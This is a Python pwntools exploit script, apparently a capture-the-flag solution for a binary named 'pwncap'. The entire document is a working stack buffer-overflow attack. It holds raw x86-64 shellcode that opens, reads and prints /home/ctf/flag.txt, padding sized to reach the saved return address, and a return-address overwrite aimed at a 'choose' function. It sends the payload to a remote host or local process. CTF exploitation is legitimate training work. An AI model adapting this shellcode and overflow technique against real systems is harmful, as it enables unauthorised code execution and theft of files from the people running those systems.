import struct
import sys
from pwnlib.tubes import remote, process


def solve(conn):
    # CHOOSE
    # readelf -s ./pwncap | grep choose
    CHOOSE = 0x0000000000401277
    choose_packed = struct.pack('<Q', CHOOSE)

    PAD_LEN = (0x7fffffffd4e8-0x7fffffffd3e2)

    buf  = b""
    buf += b"\xeb\x42\x5f\x80\x77\x12\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05"
    buf += b"\x66\x81\xec\x00\x01\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba"
    buf += b"\x00\x01\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2"
    buf += b"\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xff\x48\x31\xc0\x04\x3c\x0f\x05"
    buf += b"\xe8\xb9\xff\xff\xff\x2f\x68\x6f\x6d\x65\x2f\x63\x74\x66\x2f\x66\x6c"
    buf += b"\x61\x67\x2e\x74\x78\x74\x41"


    buf += b'A'*(PAD_LEN-len(buf))
    buf += choose_packed
    buf += b'A'

    conn.send(struct.pack('>H', len(buf)))
    conn.send(buf)
    print(conn.recv())


def main(endpoint):
    if ':' in endpoint:
        host, port = endpoint.split(':')
        port = int(port)
        conn = remote.remote(host, port)
    else:
        conn = process.process(endpoint)
    solve(conn)


if __name__ == '__main__':
    main(sys.argv[1])
